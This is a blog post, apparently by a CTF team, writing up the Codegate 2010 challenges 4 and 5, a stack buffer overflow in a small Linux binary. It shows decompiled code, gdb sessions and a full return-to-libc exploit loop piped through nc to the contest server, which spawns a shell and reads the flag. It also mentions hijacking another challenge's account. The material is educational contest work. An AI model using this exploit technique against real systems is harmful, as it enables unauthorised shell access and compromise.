---
title: 'Codegate 2010 online CTF &#8211; Challenge 4 &amp; 5 writeup'
author: longld
layout: post

aktt_notify_twitter:
  - no
tweetbackscheck:
  - 1408358984
shorturls:
  - 'a:4:{s:9:"permalink";s:81:"http://www.vnsecurity.net/2010/03/codegate-2010-online-ctf-challenge-4-5-writeup/";s:7:"tinyurl";s:26:"http://tinyurl.com/yevgbt5";s:4:"isgd";s:18:"http://is.gd/aOugw";s:5:"bitly";s:20:"http://bit.ly/cXsba1";}'
twittercomments:
  - 'a:15:{i:10669477304;s:7:"retweet";i:10576939772;s:7:"retweet";i:10576509003;s:7:"retweet";i:10574391696;s:7:"retweet";i:10574255769;s:7:"retweet";i:10570427157;s:7:"retweet";i:10567867606;s:7:"retweet";i:10566679249;s:7:"retweet";i:10566402877;s:7:"retweet";i:10566331495;s:7:"retweet";i:10566131337;s:7:"retweet";i:10566057902;s:7:"retweet";i:10566052947;s:7:"retweet";i:10565532796;s:7:"retweet";i:10565472354;s:7:"retweet";}'
tweetcount:
  - 15
category:
  - 'CTF - CLGT Crew'
tags:
  - '2010'
  - aslr
  - CLGT
  - codegate
  - CTF
  - 'CTF - CLGT Crew'
  - return-to-libc
---
# Summary

Challenge 4 has a basic buffer overflow vulnerability running on modern Ubuntu Linux with ASLR. Challenge 5 shares the same code as Challenge 4 but added NX protection to make it harder. In challenge 4 we use ret2eax to by pass ASLR and return-to-libc technique to bypass NX in challenge 5 with brute-forcing for execl() libc address. We had to access to the server (hijack account of Challenge #2) to search for execl() address, it&#8217;s weakness of our solution for challenge 5.

# Analysis

Challenge 4 information:

> credentials: ctf4.codegate.org 9000  
> BINARY FILE:  http://ctf.codegate.org/files\____/easy

Challenge 5 information:

> credentials: ctf4.codegate.org 9001  
> BINARY FILE:  http://ctf.codegate.org/files\____/harder

Both &#8220;easy&#8221; and  &#8220;harder&#8221; share the same code which looks like below:

<pre class="brush: cpp; highlight: [17]; title: ; notranslate" title="">int __cdecl main()
{
 size_t n; // [sp+18h] [bp-8h]@1
 char *lineptr; // [sp+1Ch] [bp-4h]@1

 lineptr = 0;
 printf("Input: ");
 fflush(0);
 getline(&lineptr, &n, stdin);
 func(lineptr, n);
 return puts("nThanks. Goodbye");
}

void *__cdecl func(const void *src, size_t n)
{
 char dest[264]; // [sp+10h] [bp-108h]@1
 return memcpy(dest, src, n);
}
</pre>

The traditional BOF at memcpy() in func() with 272 bytes allows us to overwrite the saved EIP to control program execution. Exploit for &#8220;easy&#8221; is obvious, you can find a writeup <a href="http://coma.0x3f.net/uncategorized/codegate2010-ctf-level-4/" target="_blank">here</a>, remain of this post will talk about Challenge 5.

The problem for exploiting &#8216;harder&#8217; is to bypass:

*   ASLR
*   NX protection

We will use return-to-libc technique to overcome that.

# Solution/Exploit

In order to exploit the &#8220;harder&#8221; we have to:

*   Locate address of execl() function in libc
*   Locate address of &#8220;/bin/sh&#8221; somewhere in memory
*   Arrange stack to call execl(&#8220;/bin/sh&#8221;, &#8230;) when return from func()

## Locate address of execl()

Based on our experience in Padocon 2010 pre-qual, we know that random mmap library address will repeat after several run.

<pre>$ gdb harder
(gdb) start
Temporary breakpoint 1, 0x0804850e in main ()
(gdb) p execl
$1 = {&lt;text variable, no debug info&gt;} 0x1a70c0 &lt;execl&gt;
(gdb) quit</pre>

## Locate address of &#8220;/bin/sh&#8221;

There&#8217;s several way to find &#8220;/bin/sh&#8221; pointer according to other contestants discussed in #codegate IRC:

*   Find &#8220;/bin/sh&#8221; address in RO_DATA of libc
*   Put &#8220;/bin/sh&#8221; in our input buffer then find stack address that points to it (address of &#8220;dest&#8221; in func())
*   Put &#8220;/bin/sh&#8221; in our input buffer then re-use &#8220;*lineptr&#8221; (already point to our buffer) remain in stack. This is our method.

Let examine the stack when we&#8217;re in func():

<pre>(gdb) disass func
Dump of assembler code for function func:
0x080484e4 &lt;func+0&gt;:    push   ebp
0x080484e5 &lt;func+1&gt;:    mov    ebp,esp
0x080484e7 &lt;func+3&gt;:    sub    esp,0x118
0x080484ed &lt;func+9&gt;:    mov    eax,DWORD PTR [ebp+0xc]      &lt;-- n
0x080484f0 &lt;func+12&gt;:   mov    DWORD PTR [esp+0x8],eax
0x080484f4 &lt;func+16&gt;:   mov    eax,DWORD PTR [ebp+0x8]      &lt;-- src's address (*lineptr)
0x080484f7 &lt;func+19&gt;:   mov    DWORD PTR [esp+0x4],eax
0x080484fb &lt;func+23&gt;:   lea    eax,[ebp-0x108]              &lt;-- dest's address
0x08048501 &lt;func+29&gt;:   mov    DWORD PTR [esp],eax
0x08048504 &lt;func+32&gt;:   call   0x80483f8 &lt;memcpy@plt&gt;
0x08048509 &lt;func+37&gt;:   leave
0x0804850a &lt;func+38&gt;:   ret
End of assembler dump.

(gdb) b *0x08048504
Breakpoint 1 at 0x8048504
(gdb) r
Starting program: /tmp/harder
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048504 in func ()
(gdb) x/20x $ebp
0xbffff738:     0xbffff768      0x08048568      0x0804b008      0x00000078
                                                [*lineptr] (2)
0xbffff748:     0x00d5b420      0xbffff768      0x00c49345      0x006c2d20
0xbffff758:     0x00000078      0x0804b008      0x08048590      0x00000000
                                [*lineptr] (1)  [garbage str]
0xbffff768:     0xbffff7e8      0x00c30b56      0x00000001      0xbffff814
0xbffff778:     0xbffff81c      0xb7fff858      0xbffff7d0      0xffffffff

(gdb) x/8x 0x0804b008
0x804b008:      0x41414141      0x41414141      0x41414141      0x41414141
0x804b018:      0x41414141      0x41414141      0x41414141      0x41414141</pre>

Address of *lineptr is **0x0804b008** which point to our buffer. There&#8217;s two instances of *lineptr address on stack: (1) returned from getline(), (2) placed before calling func(). The (2) address is useless because it&#8217;s next to ret, the (1) address with next 2 addresses **0&#215;08048590**, **0&#215;00000000** is perfect for execl(). What we need to do is lift the esp to correct address with few ret.

## Arrange buffer & stack

With all the things above, we can craft our buffer as below:

<pre>["/bin/sh" | padding | ret*6 | execl() | "n"]</pre>

This will result on stack when return from func():

<pre>[ret*6 | execl() | 0xdeadbeef | "/bin/sh" | "garbage string" | 0 ]</pre>

## Exploit

<pre>while true; do
 (python -c 'print "/bin/shx00" + "A"*260 + "x75x85x04x08"*6 + "xc0x70x1ax00" + "n"'; cat) | nc ctf4.codegate.org 9001
done
Input:
Input:
Input:

id
uid=1004(harder) gid=1004(harder)
cat /home/harder/flag.txt
e2e4cb6adc9cd761dcde774f84529591  -</pre>

# References

*   <a href="http://neworder.box.sk/newsread.php?newsid=13007" target="_blank">http://neworder.box.sk/newsread.php?newsid=13007</a>
*   <a href="http://0xbeefc0de.org/papers/fc3_bof.txt" target="_blank">http://0xbeefc0de.org/papers/fc3_bof.txt</a>

Keywords: return-to-libc, aslr, esp lifting, codegate 2010